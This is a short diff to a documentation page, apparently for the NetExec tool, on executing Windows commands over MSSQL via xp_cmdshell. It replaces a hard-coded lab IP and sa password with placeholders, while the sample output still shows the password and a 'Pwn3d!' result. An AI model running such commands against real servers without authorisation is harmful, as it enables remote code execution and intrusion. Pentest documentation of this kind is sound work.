@@ -9,7 +9,7 @@ description: Execute Windows command using NetExec
 This option use `xp_cmdshell` to exec command on the remote host.
 
 ```bash
-nxc mssql 10.10.10.59 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami
+nxc mssql $TARGET -u $USER -p $PASSWORD --local-auth -x whoami
 MSSQL       10.10.10.59     1433   None             [+] sa:GWE3V65#6KFH93@4GWTG2G (Pwn3d!)
 MSSQL       10.10.10.59     1433   None             [+] Executed command via mssqlexec
 MSSQL       10.10.10.59     1433   None             --------------------------------------------------------------------------------
